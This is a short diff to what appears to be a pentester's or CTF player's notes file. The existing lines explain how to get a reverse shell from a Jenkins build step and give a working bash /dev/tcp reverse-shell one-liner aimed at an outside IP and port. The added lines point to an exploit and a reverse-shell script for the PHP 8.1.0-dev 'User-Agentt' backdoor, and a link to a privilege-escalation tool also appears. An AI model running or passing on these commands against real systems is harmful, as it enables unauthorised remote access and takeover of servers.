@@ -27,3 +27,7 @@ https://github.com/dievus/printspoofer
    - paste reverse shell code (exemple: bash -c 'exec bash -i &>/dev/tcp/10.14.26.186/7777 <&1' )
    - save. 
    - set up netcat listener on ur host and run "Build Now" on Jenkins project. Grab your reverse shell as jenkins
+
+- PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution  https://www.exploit-db.com/exploits/49933
+  - Reverse shell script https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py
+  - Details https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
